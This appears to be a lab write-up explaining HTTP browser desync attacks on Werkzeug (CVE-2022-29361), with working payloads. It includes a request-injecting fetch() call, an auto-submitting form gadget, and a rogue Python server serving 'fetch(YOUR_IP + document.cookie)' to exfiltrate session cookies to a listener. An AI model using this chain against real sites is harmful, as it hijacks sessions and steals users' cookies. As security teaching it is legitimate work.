# HTTP Browser Desync

A Browser Desync attack targets how a web application handles persistent user connections to hijack subsequent requests.

The attack typically occurs in two stages:

1. A seemingly legitimate request poisons the connection queue by injecting an arbitrary request.
2. The next valid request on the same connection is replaced or prefixed by the injected request.

High-level attack flow:

![img](/img/BrowserDesync/1.png)

In this example, the client sends a `POST` request over a keep-alive connection, allowing multiple requests on the same TCP session. The POST body contains a hidden `GET` request. If the server mishandles the request body, the embedded request remains queued on the connection.

When the browser sends the next request, the queued malicious request is processed first, altering the expected response flow.

As a result, visiting the redirect page may return the injected `404` response instead of the intended redirect content.

## 1. Browser Desync Identification

To demonstrate HTTP Browser Desynchronization, we use a web application vulnerable to CVE-2022-29361.

```py
from flask import Flask
app = Flask(__name__) @app.route("/", methods=["GET", "POST"]) def index(): return """ CVE-2022-29361 Welcome to the Vulnerable Web Application """ if __name__ == "__main__": app.run("0.0.0.0", 5000)
```

The vulnerability affects Werkzeug v2.1.0, a WSGI web application library. Commit `4795b9a7` introduced keep-alive support when threaded or process options are enabled, creating conditions for browser desync attacks.

A simple exploitation method uses JavaScript `fetch()`, which preserves the same connection across requests. Reusing the same connection is critical because the injected request must remain in the server's request queue for the next browser request.

This can expose sensitive data such as session cookies or authenticated user actions.

Unlike typical cross-site scenarios constrained by `SameSite` and CORS policies, Browser Desync attacks occur within the same target origin, so browser protections do not prevent cookie inclusion.

Example payload:

```js
fetch('http://10.48.183.28:5000/', {
    method: 'POST',
    body: 'GET /redirect HTTP/1.1\r\nFoo: x',
    mode: 'cors',
})
```

Payload breakdown:

* `http://10.48.183.28:5000/`
  Target vulnerable endpoint.

* `method: 'POST'`
  Sends a POST request while keeping the connection alive.

* `body: 'GET /redirect HTTP/1.1\r\nFoo: x'`
  Injects a second HTTP request into the connection queue.

* `mode: 'cors'`
  Prevents automatic redirect handling and exposes the resulting error behavior.

If successful, the injected request remains queued on the connection. When the browser issues the next request, the queued request executes first.

Example attack flow:

![img](/img/BrowserDesync/2.png)

After refreshing the page, the browser processes the injected `/redirect` request, resulting in a `404` response because the route does not exist.

![img](/img/BrowserDesync/3.png)

## 2. Browser Desync Exploit Chaining XSS

One attack path is replacing the victim's next request with a malicious JavaScript resource. However, this usually requires arbitrary file upload capabilities.

A more practical approach uses a rogue server to deliver an XSS payload and steal session cookies.

Example gadget:

```html
<form id="btn" action="http://challenge.thm/"
    method="POST"
    enctype="text/plain">
<textarea name="GET http://YOUR_IP HTTP/1.1
AAA: A">placeholder1</textarea>
<button type="submit">placeholder2</button>
</form>
<script> btn.submit() </script>
```

Key points:

* The form submission maintains a keep-alive connection by default.
* `enctype="text/plain"` prevents normal form encoding, allowing raw request injection.
* The `textarea` `name` attribute overwrites bytes of the next request, redirecting it to the attacker-controlled server.

Attack flow:

1. The initial request places the victim inside the vulnerable connection context.
2. The victim's next request is replaced with a request to the rogue server.
3. The rogue server responds with malicious JavaScript, compromising the victim session.

Example malicious payload served by the rogue server:

```js
fetch('http://YOUR_IP/' + document.cookie);
```

## 3. Practical Scenario

Attack workflow:

1. Confirm the server is vulnerable to Client-Side Desync.
2. Identify functionality that stores attacker-controlled content.
3. Build a payload to hijack the victim session.
4. Chain the components for exploitation.

The following payload can be used to verify Browser Desync behavior:

```js id="vgbvaw"
fetch('http://challenge.thm/', {
    method: 'POST',
    body: 'GET /redirect HTTP/1.1\r\nFoo: x',
    mode: 'cors',
})
```

If refreshing the page results in a `404` response, the server is likely vulnerable to Browser Desync via request queue poisoning.

This lab includes a vulnerable `/contact` endpoint that stores attacker-controlled input. Submitted content is later rendered on `/vulnerablecontact`, which is automatically visited by a simulated victim user.

Payload for `/contact`:

```html id="v4ryyw"
<form id="btn" action="http://challenge.thm/"
    method="POST"
    enctype="text/plain">
<textarea name="GET http://YOUR_IP:1337 HTTP/1.1
AAA: A">placeholder1</textarea>
<button type="submit">placeholder2</button>
</form>
<script> btn.submit() </script>
```

The payload forces the victim browser into the vulnerable connection state, then rewrites the next request to the attacker-controlled server on port `1337`.

Serve a malicious JavaScript response from the rogue server:

```py id="qyrg9f"
#!/usr/bin/python3
from http.server import BaseHTTPRequestHandler, HTTPServer

class ExploitHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Content-type","text/html")

            self.end_headers()
            self.wfile.write(b"fetch('http://YOUR_IP:8080/' + document.cookie)")

def run_server(port=1337):   
    server_address = ('', port)
    httpd = HTTPServer(server_address, ExploitHandler)
    print(f"Server running on port {port}")
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
```

Run the server:

```bash id="k0m4rt"
sudo python3 server.py
```

When the victim loads the malicious response, the injected JavaScript sends the victim's cookies to the attacker on port `8080`.

Start a listener on port `8080`:

```bash id="20dg78"
python3 -m http.server 8080
```

The exploitation chain is:

1. Store malicious form payload.
2. Victim visits vulnerable page.
3. Browser connection becomes desynchronized.
4. Victim's next request is redirected to attacker infrastructure.
5. Attacker-controlled JavaScript executes in victim context.
6. Session cookies are exfiltrated.

---
